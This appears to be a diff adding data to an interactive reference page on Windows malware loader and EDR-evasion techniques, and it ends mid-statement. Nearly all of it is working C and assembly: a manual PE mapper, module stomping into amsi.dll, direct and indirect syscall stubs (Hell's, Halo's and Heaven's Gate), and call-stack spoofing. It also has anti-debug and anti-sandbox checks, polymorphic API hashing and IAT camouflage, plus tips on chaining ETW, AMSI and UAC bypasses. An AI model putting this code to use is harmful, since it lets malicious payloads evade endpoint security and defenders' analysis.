+{n:9,l:"Entry",s:"DllMain",c:"#4ade80",d:"DllMain(base, DLL_PROCESS_ATTACH, NULL)."},
+{n:10,l:"Wipe",s:"Zero page 0",c:"#ef4444",d:"Zero SizeOfHeaders bytes. Removes MZ/PE from memory."}
+];
+
+function fMAP(){return '<div class="sr" id="sr"></div><div class="sd" id="sd"></div>'}
+
+// Code examples
+function getCodes(s,d){
+var C={
+peb:[
+{t:"Get PEB (ASM)",l:"asm",c:d.pa},
+{t:"Walk module list",l:"c",c:"PPEB pPeb = (PPEB)__readgs"+(d===AD.x64?"qword":"dword")+"("+d.pc+");\nPLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;\nPLIST_ENTRY curr = head->Flink;\nwhile (curr != head) {\n    PLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(\n        curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n    if (HashUnicode(&e->BaseDllName) == TARGET_HASH)\n        return e->DllBase;\n    curr = curr->Flink;\n}"},
+{t:"Stack string (no cleartext)",l:"c",c:"wchar_t mod[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};"},
+{t:"ntdll handle (zero-compare shortcut)",l:"c",c:"// ntdll is always 2nd in InMemoryOrderModuleList\n// (1st is the exe itself)\n// No hash comparison needed!\nPPEB peb = (PPEB)__readgsqword(0x60);\nPLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;\nPLIST_ENTRY first = head->Flink;        // -> exe\nPLIST_ENTRY second = first->Flink;      // -> ntdll\nPLDR_DATA_TABLE_ENTRY ntdllEntry = CONTAINING_RECORD(\n    second, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\nHMODULE hNtdll = (HMODULE)ntdllEntry->DllBase;\n\n// kernel32 is reliably the third entry:\nPLIST_ENTRY third = second->Flink;      // -> kernel32\nHMODULE hK32 = (HMODULE)CONTAINING_RECORD(\n    third, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)->DllBase;\n\n// Even shorter with InInitializationOrderModuleList:\n// ntdll is FIRST (it initializes first)\nPLIST_ENTRY initHead = &peb->Ldr->InInitializationOrderModuleList;\nHMODULE hNtdll2 = (HMODULE)CONTAINING_RECORD(\n    initHead->Flink, LDR_DATA_TABLE_ENTRY,\n    InInitializationOrderLinks)->DllBase;"},
+{t:"PEB fields without API calls",l:"c",c:"// Rich info available directly from PEB - no API calls\nPPEB peb = (PPEB)__readgsqword(0x60);\n\n// Anti-debug (single byte check)\nif (peb->BeingDebugged) goto bail;\n\n// OS version without GetVersionEx\nDWORD osMajor = peb->OSMajorVersion;  // +0xA4 x64\nDWORD osMinor = peb->OSMinorVersion;  // +0xA8 x64\nDWORD osBuild = peb->OSBuildNumber;   // +0xAC x64\n\n// Command line without GetCommandLine\nPRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;\nPWSTR cmdLine = params->CommandLine.Buffer;\nPWSTR imagePath = params->ImagePathName.Buffer;\nPWSTR currentDir = params->CurrentDirectory.DosPath.Buffer;\n\n// Image base without GetModuleHandle(NULL)\nPVOID myBase = peb->ImageBaseAddress;\n\n// Process heap without GetProcessHeap\nPVOID heap = peb->ProcessHeap;  // +0x30 x64"},
+{t:"SharedUserData (no API, no PEB)",l:"c",c:"// 0x7FFE0000 is always mapped as SharedUserData (KUSER_SHARED_DATA)\n// Read-only, available to all processes, no API calls\n#define USD ((PKUSER_SHARED_DATA)0x7FFE0000)\n\n// Tick count without GetTickCount\nULONG ticks = USD->TickCountLow;\n\n// System time without GetSystemTime\nLARGE_INTEGER sysTime;\nsysTime.LowPart  = USD->SystemTime.LowPart;\nsysTime.HighPart = USD->SystemTime.High1Time;\n\n// Useful for timing checks (anti-sandbox)\n// Two reads far apart, check delta\nULONG t1 = USD->TickCountLow;\n// ... do work ...\nULONG t2 = USD->TickCountLow;\nif ((t2 - t1) < EXPECTED_MIN) goto sandbox_detected;\n\n// Also has NtSystemRoot (e.g. C:\\Windows)\n// for finding clean ntdll on disk"},
+{t:"XOR key from PEB address",l:"c",c:"// Cheap per-process unique XOR key\n// PEB address is randomized by ASLR\nDWORD xorKey = (DWORD)((ULONG_PTR)peb ^ ((ULONG_PTR)peb >> 16));\n\n// Use to encrypt/decrypt strings, hashes, etc.\n// Different every process launch\nfor (int i = 0; i < len; i++)\n    buf[i] ^= ((BYTE*)&xorKey)[i % 4];"},
+{t:"Anti-analysis preflight check",l:"c",c:"// Compact preflight: check everything before doing real work\nBOOL IsSafe(void) {\n    PPEB peb = (PPEB)__readgsqword(0x60);\n\n    // 1. BeingDebugged flag (PEB+0x02)\n    if (peb->BeingDebugged) return FALSE;\n\n    // 2. NtGlobalFlag (PEB+0x68 x64 / +0xBC x86)\n    //    Debugger sets: 0x70 (TAIL_CHECK|FREE_CHECK|VALIDATE_PARAMS)\n    DWORD ntGlobal = *(DWORD*)((PBYTE)peb + 0x68);\n    // mask, not exact: debugger adds these flags\n    if (ntGlobal & 0x70) return FALSE;\n\n    // 3. Hardware breakpoints via debug registers\n    CONTEXT ctx = {0};\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n    GetThreadContext(GetCurrentThread(), &ctx);\n    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return FALSE;\n\n    // 4. Heap flags (PEB->ProcessHeap)\n    //    Debugger sets Flags=0x02 and ForceFlags=0x0 differently\n    PVOID heap = peb->ProcessHeap;\n    // Heap.Flags at +0x70 x64, should be 0x02 (HEAP_GROWABLE)\n    DWORD heapFlags = *(DWORD*)((PBYTE)heap + 0x70);\n    if (heapFlags != 0x02) return FALSE;\n\n    // 5. Timing check via SharedUserData (no API call)\n    DWORD t1 = *(DWORD*)0x7FFE0320; // TickCountLow\n    // ... small busy loop ...\n    volatile int j = 0; for(int i=0;i<1000;i++) j+=i;\n    DWORD t2 = *(DWORD*)0x7FFE0320;\n    if ((t2 - t1) > 500) return FALSE; // way too slow = emulation\n\n    return TRUE;\n}"}
+],
+pe:[
+{t:"Parse PE from base",l:"c",c:"PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;\nif (dos->e_magic != 0x5A4D) return NULL;\nPIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);\nif (nt->Signature != 0x4550) return NULL;\n// nt->OptionalHeader.Magic == "+d.mg.split(' ')[0]+"\nIMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[0];\nPIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);"},
+{t:"RVA to File Offset",l:"c",c:"DWORD RvaToOffset(PBYTE base, DWORD rva) {\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(GetNtHdrs(base));\n    for (WORD i = 0; i < numSections; i++)\n        if (rva >= sec[i].VirtualAddress &&\n            rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize)\n            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;\n    return 0;\n}"},
+{t:"Section Characteristics flags cheat sheet",l:"c",c:"// Section Characteristics flags you actually use:\n//\n// Memory protection (top 3 bits):\n#define IMAGE_SCN_MEM_EXECUTE  0x20000000  // code\n#define IMAGE_SCN_MEM_READ     0x40000000  // readable\n#define IMAGE_SCN_MEM_WRITE    0x80000000  // writable\n//\n// Common section combos:\n// .text   = 0x60000020  (CODE | EXECUTE | READ)\n// .rdata  = 0x40000040  (INITIALIZED_DATA | READ)\n// .data   = 0xC0000040  (INITIALIZED_DATA | READ | WRITE)\n// .bss    = 0xC0000080  (UNINITIALIZED_DATA | READ | WRITE)\n// .reloc  = 0x42000040  (INITIALIZED_DATA | DISCARDABLE | READ)\n//\n// Mapping to VirtualProtect constants:\nDWORD CharToProtect(DWORD ch) {\n    BOOL x = ch & 0x20000000; // execute\n    BOOL w = ch & 0x80000000; // write\n    BOOL r = ch & 0x40000000; // read\n    if (x && w) return PAGE_EXECUTE_READWRITE; // avoid!\n    if (x)      return PAGE_EXECUTE_READ;\n    if (w)      return PAGE_READWRITE;\n    if (r)      return PAGE_READONLY;\n    return PAGE_NOACCESS;\n}"}
+],
+exp:[
+{t:"Custom GetProcAddress",l:"c",c:"FARPROC MyGetProcAddress(HMODULE hMod, LPCSTR name) {\n    PBYTE base = (PBYTE)hMod;\n    // ... get export directory ...\n    PDWORD nameRvas = (PDWORD)(base + exp->AddressOfNames);\n    PWORD  ords     = (PWORD)(base + exp->AddressOfNameOrdinals);\n    PDWORD funcRvas = (PDWORD)(base + exp->AddressOfFunctions);\n    for (DWORD i = 0; i < exp->NumberOfNames; i++) {\n        if (strcmp((char*)(base + nameRvas[i]), name) == 0) {\n            DWORD fRva = funcRvas[ords[i]];\n            // Forwarder check: fRva within export dir bounds?\n            if (fRva >= expDir.VA && fRva < expDir.VA + expDir.Size)\n                return NULL; // parse \"DLL.Func\", recurse\n            return (FARPROC)(base + fRva);\n        }\n    }\n    return NULL;\n}"}
+],
+hash:[
+{t:"ror13 hash",l:"c",c:"#define ROR13(x) (((x)>>13)|((x)<<19))\nDWORD ror13_hash(const char* s) {\n    DWORD h = 0;\n    while (*s) { h = ROR13(h); h += (unsigned char)*s++; }\n    return h;\n}\n// Wide variant for module names:\nDWORD ror13_w(const wchar_t* s, USHORT len) {\n    DWORD h = 0;\n    for (USHORT i=0; i<len/2; i++) {\n        wchar_t c=s[i]; if(c>='a'&&c<='z') c-=0x20;\n        h=ROR13(h); h+=(DWORD)c;\n    }\n    return h;\n}"},
+{t:"Compile-time hash (C++17)",l:"c",c:"consteval DWORD ct_hash(const char* s) {\n    DWORD h = 5381;\n    while (*s) h = ((h<<5)+h) + *s++;\n    return h;\n}\n#define HASH_LoadLibraryA ct_hash(\"LoadLibraryA\")\n// Only hash constants in binary - zero API strings"},
+{t:"Polymorphic hash (runtime salt)",l:"c",c:"DWORD poly_hash(const char* s, DWORD salt) {\n    DWORD h = salt;\n    while (*s) { h^=(unsigned char)*s++; h*=0x01000193; h^=salt; }\n    return h;\n}\n// Salt from RDTSC/PID - hashes change per run\n// Defeats static hash signature detection"}
+],
+imp:[
+{t:"Walk and resolve IAT",l:"c",c:"for (; imp->Name; imp++) {\n    HMODULE hMod = LoadLibraryA((char*)(mapped + imp->Name));\n    PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)(mapped + imp->OriginalFirstThunk);\n    PIMAGE_THUNK_DATA iat  = (PIMAGE_THUNK_DATA)(mapped + imp->FirstThunk);\n    for (; orig->u1.AddressOfData; orig++, iat++) {\n        if (orig->u1.Ordinal & "+d.om+")\n            iat->u1.Function = ("+d.ic+")GetByOrd(hMod, orig->u1.Ordinal & 0xFFFF);\n        else {\n            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)\n                (mapped + orig->u1.AddressOfData);\n            iat->u1.Function = ("+d.ic+")MyGetProcAddress(hMod, ibn->Name);\n        }\n    }\n}"},
+{t:"IAT camouflage",l:"c",c:"// Add benign imports so static analysis sees normal app\n#pragma comment(lib, \"kernel32.lib\")\n#pragma comment(lib, \"user32.lib\")\nvolatile auto _d1 = &GetSystemTime;\nvolatile auto _d2 = &MessageBoxA;\n// Real calls go through hashed PEB walk"},
+{t:"Nt* function typedefs (common)",l:"c",c:"// Typedefs for the Nt* functions you call most often\n// via hashed resolution or direct syscall\n\ntypedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(\n    HANDLE    ProcessHandle,    // -1 for self\n    PVOID*    BaseAddress,      // in/out\n    ULONG_PTR ZeroBits,         // 0\n    PSIZE_T   RegionSize,       // in/out\n    ULONG     AllocationType,   // MEM_COMMIT|MEM_RESERVE\n    ULONG     Protect           // PAGE_READWRITE\n);\n\ntypedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(\n    HANDLE    ProcessHandle,\n    PVOID*    BaseAddress,      // in/out (page-aligned)\n    PSIZE_T   RegionSize,       // in/out\n    ULONG     NewProtect,\n    PULONG    OldProtect        // out\n);\n\ntypedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(\n    HANDLE    ProcessHandle,\n    PVOID     BaseAddress,\n    PVOID     Buffer,\n    SIZE_T    NumberOfBytes,\n    PSIZE_T   NumberOfBytesWritten  // opt\n);\n\ntypedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(\n    PHANDLE   ThreadHandle,     // out\n    ACCESS_MASK DesiredAccess,   // THREAD_ALL_ACCESS\n    PVOID     ObjectAttributes, // NULL\n    HANDLE    ProcessHandle,    // -1 for self\n    PVOID     StartRoutine,     // entry point\n    PVOID     Argument,         // param\n    ULONG     CreateFlags,      // 0 or THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER\n    SIZE_T    ZeroBits,\n    SIZE_T    StackSize,\n    SIZE_T    MaxStackSize,\n    PVOID     AttributeList     // NULL\n);\n\n// Usage after hashed resolve:\nNtAllocateVirtualMemory_t pNtAlloc =\n    (NtAllocateVirtualMemory_t)ResolveHash(\n        HASH_NTDLL, HASH_NtAllocateVirtualMemory);\nPVOID base = NULL;\nSIZE_T size = 0x1000;\nNTSTATUS status = pNtAlloc(\n    (HANDLE)-1, &base, 0, &size,\n    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);"}
+],
+rel:[
+{t:"Process base relocations",l:"c",c:"ptrdiff_t delta = (ptrdiff_t)(mapped - preferred);\nif (!delta) return;\nPIMAGE_BASE_RELOCATION blk = (PIMAGE_BASE_RELOCATION)(mapped + rd.VA);\nwhile (blk->VirtualAddress) {\n    PBYTE page = mapped + blk->VirtualAddress;\n    DWORD n = (blk->SizeOfBlock - 8) / 2;\n    PWORD ent = (PWORD)((PBYTE)blk + 8);\n    for (DWORD i=0; i<n; i++) {\n        WORD type=ent[i]>>12, off=ent[i]&0xFFF;\n        if (type==3) *(DWORD*)(page+off) += (DWORD)delta;"+(d===AD.x64?"\n        else if (type==10) *(ULONGLONG*)(page+off) += delta;":"")+"\n    }\n    blk = (PIMAGE_BASE_RELOCATION)((PBYTE)blk + blk->SizeOfBlock);\n}"}
+],
+map:[
+{t:"Full manual mapper",l:"c",c:"PBYTE base = (PBYTE)VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,\n    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE); // Never RWX!\nmemcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);\nPIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\nfor (WORD i=0; i<nt->FileHeader.NumberOfSections; i++)\n    if (sec[i].SizeOfRawData)\n        memcpy(base+sec[i].VirtualAddress,\n               raw+sec[i].PointerToRawData, sec[i].SizeOfRawData);\nProcessRelocations(base, (PBYTE)nt->OptionalHeader.ImageBase);\nResolveImports(base);\n// Permission cycling\nfor (WORD i=0; i<nt->FileHeader.NumberOfSections; i++) {\n    DWORD p=PAGE_READONLY, ch=sec[i].Characteristics;\n    if (ch&0x20000000) p=PAGE_EXECUTE_READ;\n    else if (ch&0x80000000) p=PAGE_READWRITE;\n    DWORD old; VirtualProtect(base+sec[i].VirtualAddress,\n        sec[i].Misc.VirtualSize, p, &old);\n}\n// Entry\n((BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))\n    (base+nt->OptionalHeader.AddressOfEntryPoint))\n    ((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);\nmemset(base, 0, nt->OptionalHeader.SizeOfHeaders);"},
+{t:"Module stomping",l:"c",c:"HMODULE hDecoy = LoadLibraryExA(\n    \"C:\\\\Windows\\\\System32\\\\amsi.dll\",\n    NULL, DONT_RESOLVE_DLL_REFERENCES);\nPIMAGE_SECTION_HEADER text = FindSection((PBYTE)hDecoy, \".text\");\nDWORD old;\nVirtualProtect((PBYTE)hDecoy+text->VirtualAddress,\n    text->Misc.VirtualSize, PAGE_READWRITE, &old);\nmemcpy((PBYTE)hDecoy+text->VirtualAddress, payload, payloadSize);\nVirtualProtect((PBYTE)hDecoy+text->VirtualAddress,\n    text->Misc.VirtualSize, PAGE_EXECUTE_READ, &old);\n// Code lives inside \"legitimate\" module memory"}
+],
+byp:[
+{t:"ETW is usermode-only blind",d:"Patching EtwEventWrite only kills usermode ETW consumers. Kernel ETW (EtwTi) fires from kernel callbacks and cannot be patched from usermode. Kernel telemetry still sees NtAllocateVirtualMemory, NtMapViewOfSection, NtProtectVirtualMemory calls. This buys you time, not invisibility."},
+{t:"AMSI scan order matters",d:"AMSI scans happen at script block boundaries. If you split your payload across multiple blocks, each individual block may pass scanning. Also: AMSI doesn't scan compiled .NET assemblies loaded via Assembly.Load(byte[]) in all contexts - the bypass may not even be needed."},
+{t:"Patch timing is critical",d:"Patch ETW/AMSI BEFORE your real payload runs, then optionally restore original bytes after. Some EDRs periodically check function prologues for patches (integrity scanning). Restore originals, then re-patch only during active operations."},
+{t:"UAC bypass selection criteria",d:"fodhelper and computerdefaults require registry writes to HKCU (noisy). Mock directory technique requires creating dirs in C:\\Windows (may trigger alerts). COM hijacking via CMSTP or wsreset is quieter but more complex. Choose based on target EDR's monitored events."},
+{t:"Chain your bypasses",d:"Full bypass chain: (1) Resolve Nt* via hashed PEB walk, (2) ETW patch via direct syscall, (3) AMSI patch via direct syscall, (4) load payload via manual map or CLR host, (5) restore patches. Each step uses the previous step's infrastructure."},
+{t:"CLR ETW is separate from ntdll ETW",d:"The .NET CLR has its own ETW provider (Microsoft-Windows-DotNETRuntime). Patching ntdll!EtwEventWrite doesn't silence CLR ETW if the runtime uses its own code path. Patch both, or target the CLR provider GUID specifically."},
+{t:"Unhooking vs patching tradeoffs",d:"Unhooking (remapping clean ntdll) restores ALL functions but is very detectable (private memory vs image-backed). Patching specific functions is surgical but you must know exactly which functions to patch. Syscalls bypass hooks entirely without touching ntdll at all."}
+],
+kit:[{t:"Module order is guaranteed",d:"ntdll is always 1st initialized (InInitOrder) and 2nd in memory order (InMemoryOrder). kernel32 is 3rd in memory order. These positions are set by the Windows loader and have been stable since XP. Two pointer dereferences, zero comparisons."},{t:"SharedUserData is unmonitorable",d:"0x7FFE0000 is a read-only mapping of kernel data. EDRs cannot hook it because it is mapped from kernel space. Provides tick count, system time, NT version, system root path. Perfect for timing checks and OS detection without any API calls."},{t:"PEB has everything for preflight",d:"BeingDebugged, NtGlobalFlag, heap flags, OS version, command line, image path, current directory, process heap - all at fixed offsets. A single PEB pointer gives you enough for comprehensive anti-analysis without a single API call."},{t:"Debug register checks via GetThreadContext",d:"Hardware breakpoints set DR0-DR3. Call GetThreadContext with CONTEXT_DEBUG_REGISTERS. If any DR is non-zero, analyst is using hardware breakpoints. Note: GetThreadContext itself can be hooked - consider direct NtGetContextThread."},{t:"Combine timing sources",d:"Cross-reference multiple timing sources: SharedUserData.TickCountLow, RDTSC/RDTSCP, QueryPerformanceCounter. If they disagree significantly, someone is patching one but not others. Sandboxes often only hook one timing source."},{t:"KnownDlls over disk reads",d:"\\KnownDlls\\ntdll.dll is the kernel-cached section object. NtOpenSection + NtMapViewOfSection is faster than CreateFile + ReadFile on the disk copy, and guaranteed to be the same version the process loaded."}],
+sys:[
+{t:"Direct syscall stub",l:"asm",c:d===AD.x64?"NtAllocateVirtualMemory PROC\n    mov  r10, rcx          ; arg1 -> r10\n    mov  eax, <SSN>        ; syscall number\n    syscall                 ; kernel\n    ret\nNtAllocateVirtualMemory ENDP\n\n; Indirect (fixes call stack):\n    mov  r10, rcx\n    mov  eax, <SSN>\n    jmp  qword ptr [ntdll_syscall_ret]":"NtAllocateVirtualMemory PROC\n    mov  eax, <SSN>\n    mov  edx, 0x7FFE0300   ; SystemCall\n    call dword ptr [edx]   ; KiFastSystemCall\n    ret  18h\nNtAllocateVirtualMemory ENDP"},
+{t:"Extract SSN from clean ntdll",l:"c",c:"// Read ntdll from disk, parse exports, find stub\n// Pattern: 4C 8B D1 B8 XX XX 00 00\nPBYTE stub = (PBYTE)func;\nif (stub[0]==0x4C && stub[1]==0x8B && stub[3]==0xB8)\n    return *(DWORD*)(stub + 4); // SSN at offset +4"},
+{t:"Hell's Gate (neighbor SSN)",l:"c",c:"// If hooked, scan neighbors (~32 bytes apart)\nfor (int off=1; off<500; off++) {\n    PBYTE dn = funcAddr + (off*32);\n    if (dn[0]==0x4C && dn[3]==0xB8)\n        return *(DWORD*)(dn+4) - off;\n    PBYTE up = funcAddr - (off*32);\n    if (up[0]==0x4C && up[3]==0xB8)\n        return *(DWORD*)(up+4) + off;\n}"},
+{t:"Halo's Gate (full implementation)",l:"c",c:"// Halo's Gate: dynamically resolve SSN even when target is hooked\n// Combines clean-stub detection with neighbor scanning\n\nDWORD HalosGate(PBYTE ntdllBase, DWORD funcHash) {\n    // 1. Find target function via export hash\n    PBYTE funcAddr = (PBYTE)HashResolve(ntdllBase, funcHash);\n    \n    // 2. Check if stub is clean (unhoooked)\n    //    Clean pattern: 4C 8B D1 B8 XX XX 00 00 0F 05 C3\n    //    mov r10,rcx; mov eax,SSN; syscall; ret\n    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B &&\n        funcAddr[2] == 0xD1 && funcAddr[3] == 0xB8) {\n        // Clean - read SSN directly\n        return *(DWORD*)(funcAddr + 4);\n    }\n    \n    // 3. Hooked! Scan neighboring stubs\n    //    NT syscall stubs are sequential and ~32 bytes each\n    //    If neighbor N has SSN=X, target SSN = X +/- N\n    for (WORD i = 1; i < 500; i++) {\n        // Scan DOWN (higher addresses = higher SSNs)\n        PBYTE down = funcAddr + (i * 32);\n        if (down[0] == 0x4C && down[3] == 0xB8) {\n            return *(DWORD*)(down + 4) - i;\n        }\n        // Scan UP (lower addresses = lower SSNs)\n        PBYTE up = funcAddr - (i * 32);\n        if (up[0] == 0x4C && up[3] == 0xB8) {\n            return *(DWORD*)(up + 4) + i;\n        }\n    }\n    return 0; // All neighbors hooked - fallback needed\n}\n\n// Usage:\nDWORD ssn = HalosGate(ntdllBase, HASH_NtAllocateVirtualMemory);\n// Build syscall stub with resolved SSN\nBYTE stub[] = { 0x4C,0x8B,0xD1,  // mov r10, rcx\n                0xB8,0,0,0,0,     // mov eax, SSN\n                0x0F,0x05,         // syscall\n                0xC3 };            // ret\n*(DWORD*)(stub + 4) = ssn;"},
+{t:"Heaven's Gate (WoW64 x86\u219264-bit)",l:"asm",c:"; Heaven's Gate: switch from x86 to x64 mode in WoW64 process\n; WoW64 hooks ntdll32 but native ntdll64 is often clean\n; Far jump to CS=0x33 switches CPU to 64-bit long mode\n\n; --- x86 code calling 64-bit NtAllocateVirtualMemory ---\n\nHeavensGate PROC\n    ; Save 32-bit state\n    push ebp\n    mov  ebp, esp\n    \n    ; Switch to 64-bit mode via far jump\n    ; CS=0x33 is the 64-bit code segment in WoW64\n    push 0x33                    ; 64-bit CS selector\n    call $+5                     ; push EIP\n    add  dword ptr [esp], 5      ; fixup to point past retf\n    retf                          ; far return = mode switch!\n    \n    ; --- Now executing in 64-bit mode ---\n    ; Set up 64-bit syscall\n    ; Arguments must follow x64 calling convention\n    ; (rcx, rdx, r8, r9, stack)\n    \n    mov  r10, rcx                ; syscall convention\n    mov  eax, <SSN>              ; 64-bit SSN (different from WoW64!)\n    syscall                       ; native 64-bit syscall\n    \n    ; Switch back to 32-bit mode\n    push 0x23                    ; 32-bit CS selector\n    call $+5\n    add  dword ptr [esp], 5\n    retf                          ; back to x86 mode\n    \n    mov  esp, ebp\n    pop  ebp\n    ret\nHeavensGate ENDP\n\n; NOTE: SSNs for 64-bit ntdll differ from WoW64 ntdll!\n; Must resolve SSN from the 64-bit ntdll loaded at\n; high address (find via 64-bit PEB at GS:[0x60])"},
+{t:"Call stack spoofing",l:"c",c:"// Call stack spoofing: forge legitimate-looking stack frames\n// so EDR stack walks see ntdll -> kernel32 -> your.exe\n// instead of suspicious direct syscall return addresses\n\ntypedef struct _SPOOF_FRAME {\n    ULONG_PTR retAddr;       // fake return address in legit module\n    ULONG_PTR rbp;           // chain to next fake frame\n} SPOOF_FRAME;\n\n// Method 1: Synthetic frame construction\nvoid SpoofCallStack(PVOID targetFunc, PVOID arg1) {\n    // Find gadgets in legitimate modules:\n    // Need: 'jmp [rbx]' or 'call [rbx]' in kernel32/ntdll\n    PBYTE gadget = FindGadget(hKernel32, 0xFF, 0x23); // jmp [rbx]\n    \n    // Build fake RBP chain pointing through legit modules\n    SPOOF_FRAME frames[3];\n    frames[0].retAddr = (ULONG_PTR)GetProcAddress(hKernel32,\n                         \"BaseThreadInitThunk\") + 0x14;\n    frames[0].rbp = (ULONG_PTR)&frames[1];\n    frames[1].retAddr = (ULONG_PTR)GetProcAddress(hNtdll,\n                         \"RtlUserThreadStart\") + 0x21;\n    frames[1].rbp = 0; // end of chain\n    \n    // Manipulate RSP/RBP to point to our fake frames\n    // then call target via gadget chain\n}\n\n// Method 2: Frame-pointer based (simpler)\n// Before syscall, set RBP to point into a legitimate\n// module's stack frame. The unwinder follows RBP chain:\n//\n//   [your code] -> RBP points to fake frame in ntdll\n//   [fake ntdll frame] -> RBP points to kernel32 frame\n//   [fake k32 frame] -> RBP = 0 (thread start)\n//\n// EDR sees: ntdll!NtAllocateVirtualMemory\n//           kernel32!BaseThreadInitThunk\n//           ntdll!RtlUserThreadStart\n// Looks like a normal API call chain\n\n// Method 3: Return address masking\n// Use VirtualProtect to mark stack page as guard page\n// Intercept the stack walk exception to feed fake frames"},
+{t:"Indirect syscall with stack spoof",l:"asm",c:"; Combined: indirect syscall + stack spoof\n; This is the gold standard for modern evasion\n\nSpoofedSyscall PROC\n    ; 1. Save real return address\n    pop  rdi                     ; save caller's ret addr\n    \n    ; 2. Build fake stack frame\n    ;    Push fake return address (inside ntdll)\n    mov  rax, [ntdll_BaseThreadInitThunk]\n    push rax                     ; fake ret addr\n    \n    ; 3. Push real return (we'll restore after)\n    push rdi\n    \n    ; 4. Set up syscall\n    mov  r10, rcx\n    mov  eax, SSN\n    \n    ; 5. JMP to syscall;ret inside ntdll\n    ;    This fixes both:\n    ;    - Return address (points to ntdll)\n    ;    - Syscall origin (instruction in ntdll)\n    jmp  qword ptr [ntdll_syscall_ret_gadget]\n    \n    ; After syscall returns, execution continues\n    ; at our real return address (step 3)\nSpoofedSyscall ENDP\n\n; Finding the gadget:\n; Scan ntdll for: 0F 05 C3 (syscall; ret)\n; ntdll_syscall_ret_gadget points to this address"},
+{t:"Common SSN table (Win10/11 x64)",l:"c",c:"// SSNs for frequently used Nt* functions across Windows builds\n// SSNs increment with each new build - resolve dynamically!\n// These are approximate and for reference only.\n//\n// Function                    1809  1903  2004  21H2  22H2  23H2\n// NtAllocateVirtualMemory     0x18  0x18  0x18  0x18  0x18  0x18\n// NtProtectVirtualMemory      0x50  0x50  0x50  0x50  0x50  0x50\n// NtWriteVirtualMemory        0x3A  0x3A  0x3A  0x3A  0x3A  0x3A\n// NtReadVirtualMemory         0x3F  0x3F  0x3F  0x3F  0x3F  0x3F\n// NtCreateThreadEx            0xC1  0xC2  0xC2  0xC7  0xC7  0xCB\n// NtOpenProcess               0x26  0x26  0x26  0x26  0x26  0x26\n// NtClose                     0x0F  0x0F  0x0F  0x0F  0x0F  0x0F\n// NtQueryInformationProcess   0x19  0x19  0x19  0x19  0x19  0x19\n// NtCreateSection             0x4A  0x4A  0x4A  0x4A  0x4A  0x4A\n// NtMapViewOfSection          0x28  0x28  0x28  0x28  0x28  0x28\n// NtUnmapViewOfSection        0x2A  0x2A  0x2A  0x2A  0x2A  0x2A\n// NtFreeVirtualMemory         0x1E  0x1E  0x1E  0x1E  0x1E  0x1E\n// NtWaitForSingleObject       0x04  0x04  0x04  0x04  0x04  0x04\n//\n// NOTE: Some SSNs (like NtCreateThreadEx) change between builds!\n// Core memory/process ones (NtAlloc, NtProtect, NtWrite) tend\n// to be stable. ALWAYS verify dynamically - don't hardcode.\n// Use Halo's Gate or clean ntdll extraction for reliability."},
+{t:"Find syscall;ret gadget in ntdll",l:"c",c:"// Scan ntdll .text section for syscall;ret (0F 05 C3)\n// This is the target for indirect syscalls\nPBYTE FindSyscallRet(HMODULE hNtdll) {\n    PIMAGE_SECTION_HEADER text = FindSection((PBYTE)hNtdll, \".text\");\n    PBYTE start = (PBYTE)hNtdll + text->VirtualAddress;\n    DWORD size  = text->Misc.VirtualSize;\n    \n    for (DWORD i = 0; i < size - 2; i++) {\n        if (start[i]   == 0x0F &&   // syscall\n            start[i+1] == 0x05 &&\n            start[i+2] == 0xC3) {   // ret\n            return &start[i];\n        }\n    }\n    return NULL;\n}\n\n// For randomization (avoid signature on fixed offset):\n// Collect ALL matches, pick one at random each run\nPBYTE FindRandomSyscallRet(HMODULE hNtdll) {\n    PBYTE matches[256];\n    int count = 0;\n    // ... scan and collect all matches ...\n    // Return random one:\n    DWORD tick = *(DWORD*)0x7FFE0320;\n    return matches[tick % count];\n}"}
+]};
+C.byp=[
